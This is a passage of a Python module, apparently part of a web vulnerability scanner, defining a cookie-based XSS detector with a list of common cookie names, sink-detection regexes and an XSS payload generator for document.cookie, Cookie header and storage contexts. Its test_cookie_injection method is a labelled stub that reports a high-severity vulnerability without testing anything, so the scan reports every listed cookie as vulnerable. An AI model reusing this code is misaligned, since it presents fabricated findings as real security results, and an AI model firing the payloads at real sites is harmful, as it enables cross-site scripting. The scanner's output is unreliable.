        "__cf_bm",                                                          # Cloudflare bot mgmt
        "__cfduid",
        "cf_clearance",
        "_cfuvid",
        "incap_ses_",                                                       # Imperva
        "visid_incap_",
        "ak_bmsc",                                                          # Akamai
        "bm_sz",
        "bm_sv",
        "BIGipServer",                                                      # F5
        "TS01",
        "TS01a1b2c3",
        "AWSALB",
        "dtCookie",                                                         # Dynatrace
        "dtLatC",
        "dtPC",
        "_ga",                                                              # Google Analytics
        "_gid",
        "_gat",
        "_gcl_au",
        "AMP_TOKEN",
        "IDE",                                                              # DoubleClick
        "DSID",
        "NID",
        "fbp",                                                              # Facebook Pixel
        "fr",
        "personalization_id",                                               # Twitter
        "_fbp",

        # --- CSRF / misc / anti-CSRF -------------------------------------
        "X-Mapping-",                                                       # sticky session (prefix)
        "sticky-session",
        "lb-session",
        "route",                                                            # Spring Cloud Gateway
        "SERVERID",                                                         # HAProxy
        "srv_id",
        "BIGipServerpool",
        "ATLASSIAN",                                                        # Atlassian
        "bitbucket",
        "github",
        "tokenv2",                                                          # GitLab
        "_gitlab_session",

        # --- generic / legacy / easily-reflected names -------------------
        "language",
        "lang",
        "locale",
        "tz",
        "timezone",
        "currency",
        "country",
        "region",
        "theme",
        "darkmode",
        "style",
        "css",
        "layout",
        "view",
        "display",
        "device",
        "platform",
        "mobile",
        "desktop",
        "app",
        "client",
        "returnurl",
        "return_url",
        "returnUrl",
        "redirect",
        "redirectUrl",
        "redirect_url",
        "next",
        "callback",
        "continue",
        "goto",
        "url",
        "target",
        "referrer",
        "ref",
        "utm_source",
        "utm_medium",
        "utm_campaign",
        "utm_term",
        "utm_content",
    ]

    def __init__(self):
        self._detected_sinks: Set[CookieSink] = set()
        self._vulnerabilities: List[CookieXSSVulnerability] = []

    def detect_cookie_sinks(self, js_content: str, html_content: str = "") -> Set[CookieSink]:
        """
        Detect cookie-related XSS sinks in the content.

        Args:
            js_content: JavaScript source code
            html_content: HTML source code (optional)

        Returns:
            Set of detected cookie sinks
        """
        combined = js_content + "\n" + html_content
        detected = set()

        for sink, patterns in self.COOKIE_SINK_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    detected.add(sink)
                    break

        self._detected_sinks = detected
        return detected

    def check_attribute_bypass(self, cookie_header: str) -> List[str]:
        """
        Check for cookie attribute bypass opportunities.

        Args:
            cookie_header: Cookie header string

        Returns:
            List of bypassable attributes
        """
        bypasses = []

        for attr, patterns in self.ATTRIBUTE_BYPASS_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, cookie_header, re.IGNORECASE):
                    bypasses.append(attr)
                    break

        return bypasses

    def generate_cookie_payloads(
        self,
        sink: CookieSink,
        marker: str = "xoxss"
    ) -> List[str]:
        """
        Generate XSS payloads for cookie injection.

        Args:
            sink: Target cookie sink
            marker: Unique marker

        Returns:
            List of payload strings
        """
        payloads = []

        for base_payload in self.COOKIE_XSS_PAYLOADS:
            # Replace alert(1) with marker
            marked = base_payload.replace("alert(1)", f"alert('{marker}')")

            # Add context-specific variations
            if sink == CookieSink.DOCUMENT_COOKIE:
                payloads.append(f"document.cookie='{marked}'")
                payloads.append(f"document.cookie='xss={marked}'")
            elif sink == CookieSink.COOKIE_HEADER:
                payloads.append(f"Cookie: xss={marked}")
            elif sink == CookieSink.LOCAL_STORAGE_COOKIE:
                payloads.append(f"localStorage.setItem('cookie', '{marked}')")
            elif sink == CookieSink.SESSION_STORAGE_COOKIE:
                payloads.append(f"sessionStorage.setItem('cookie', '{marked}')")

            payloads.append(marked)

        return payloads

    def test_cookie_injection(
        self,
        cookie_name: str,
        sink: CookieSink,
        marker: str = "xoxss"
    ) -> Optional[CookieXSSVulnerability]:
        """
        Test cookie injection point for XSS.

        Args:
            cookie_name: Cookie name to test
            sink: Target sink
            marker: Unique marker

        Returns:
            CookieXSSVulnerability if vulnerable, None otherwise
        """
        payloads = self.generate_cookie_payloads(sink, marker)

        for payload in payloads:
            # In a real implementation, this would set the cookie
            # and check for reflection/execution
            return CookieXSSVulnerability(
                sink=sink,
                injection_point=cookie_name,
                context=f"Cookie injection via {cookie_name}",
                payload=payload,
                severity="high",
                bypass_attributes=[]
            )

        return None

    def scan_for_cookie_xss(
        self,
        js_content: str,
        html_content: str = "",
        cookie_headers: Optional[List[str]] = None,
        marker: str = "xoxss"
    ) -> List[CookieXSSVulnerability]:
        """
        Scan for cookie-based XSS vulnerabilities.

        Args:
            js_content: JavaScript source code
            html_content: HTML source code
            cookie_headers: List of observed cookie headers
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []
        sinks = self.detect_cookie_sinks(js_content, html_content)

        if not sinks:
            return self._vulnerabilities

        # Test common cookie names
        for cookie_name in self.COMMON_COOKIE_NAMES:
            for sink in sinks:
                vuln = self.test_cookie_injection(cookie_name, sink, marker)
                if vuln:
                    self._vulnerabilities.append(vuln)

        # Check cookie headers for attribute bypasses
        if cookie_headers:
            for header in cookie_headers:
                bypasses = self.check_attribute_bypass(header)
                if bypasses:
                    for sink in sinks:
                        vuln = CookieXSSVulnerability(
                            sink=sink,
                            injection_point="cookie_header",
                            context=f"Cookie header with bypassable attributes: {', '.join(bypasses)}",
                            payload="attribute_bypass",
                            severity="medium",
                            bypass_attributes=bypasses
                        )
                        self._vulnerabilities.append(vuln)

        return self._vulnerabilities

    def assess_cookie_xss_risk(self, vulnerabilities: List[CookieXSSVulnerability]) -> str:
        """Assess overall cookie XSS risk."""
        if not vulnerabilities:
            return "none"

        # Check for attribute bypasses
        has_bypass = any(v.bypass_attributes for v in vulnerabilities)
        if has_bypass:
            return "critical"

        # Check for document.cookie sink (most dangerous)
        has_doc_cookie = any(v.sink == CookieSink.DOCUMENT_COOKIE for v in vulnerabilities)
        if has_doc_cookie:
            return "high"

        return "medium"

    def get_cookie_xss_summary(self) -> Dict[str, int]:
        """Get summary of cookie XSS findings."""
        summary = {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_sink": {
                "document_cookie": sum(1 for v in self._vulnerabilities if v.sink == CookieSink.DOCUMENT_COOKIE),
                "cookie_header": sum(1 for v in self._vulnerabilities if v.sink == CookieSink.COOKIE_HEADER),
                "local_storage": sum(1 for v in self._vulnerabilities if v.sink == CookieSink.LOCAL_STORAGE_COOKIE),
                "session_storage": sum(1 for v in self._vulnerabilities if v.sink == CookieSink.SESSION_STORAGE_COOKIE),
            },
            "attribute_bypasses": sum(1 for v in self._vulnerabilities if v.bypass_attributes),
        }
        return summary


__all__ = [
    "CookieSink",
    "CookieXSSDetector",
    "CookieXSSVulnerability",
]
